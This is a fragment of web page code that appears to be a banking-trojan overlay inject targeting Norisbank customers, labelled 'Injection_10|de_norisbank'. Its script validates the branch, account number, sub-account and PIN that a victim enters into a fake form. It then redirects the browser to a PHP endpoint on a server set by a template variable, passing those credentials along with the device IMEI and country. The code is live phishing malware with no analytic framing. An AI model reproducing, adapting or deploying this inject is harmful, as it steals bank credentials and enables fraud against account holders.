            var oCodeInp = document.getElementById('account-number');
            var oCode2Inp = document.getElementById('subaccount');
            var oCode3Inp = document.getElementById('pin');

            try{
                oNumInp.className = 'field1';
                oCodeInp.className = 'field';
                oCode2Inp.className = 'field1';
                oCode3Inp.className = 'field2';
            } catch(e){};

            if (!/^\w{3,13}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field1 error';
                } catch(e){};
                return false;
            }

            if (!/^\w{7,13}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field error';
                } catch(e){};
                return false;
            }

            if (!/^\w{2,13}$/i.test(oCode2Inp.value)) {
                try{
                    oCode2Inp.className = 'field1 error';
                } catch(e){};
                return false;
            }

            if (!/^\w{5,13}$/i.test(oCode3Inp.value)) {
                try{
                    oCode3Inp.className = 'field2 error';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_10|de_norisbank|Branch: "+oNumInp.value+"//br//Account-number: "+oCodeInp.value+"//br//SubAccount: "+oCode2Inp.value+"//br//PIN: "+oCode3Inp.value);

           return false;
       };

   })();
</script>
</body>
</html>
